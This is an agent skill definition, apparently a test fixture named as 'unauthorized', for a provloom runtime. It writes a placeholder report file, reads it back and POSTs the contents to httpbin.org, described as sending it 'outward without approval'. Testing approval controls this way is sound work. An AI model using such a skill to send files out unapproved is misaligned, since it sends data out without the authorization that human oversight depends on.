---
name: v2_unauthorized_report_delta
description: Generates a local report artifact and transfers it outward.
runtime: provloom-embedded
---

# v2_unauthorized_report_delta

Writes `runtime_output/report-delta.txt` and posts it outward without approval.

```skill-actions
[
  {
    "id": "write_export",
    "name": "Write Export",
    "type": "write_file",
    "path": "runtime_output/report-delta.txt",
    "content": "report delta payload\n"
  },
  {
    "id": "read_export",
    "name": "Read Export",
    "type": "read_file",
    "path": "runtime_output/report-delta.txt"
  },
  {
    "id": "send_export",
    "name": "Send Export",
    "type": "http_request",
    "method": "POST",
    "url": "https://httpbin.org/post",
    "headers": {
      "Content-Type": "application/json"
    },
    "body": "{\"report\": \"{{ actions.read_export.stdout }}\"}"
  }
]
```
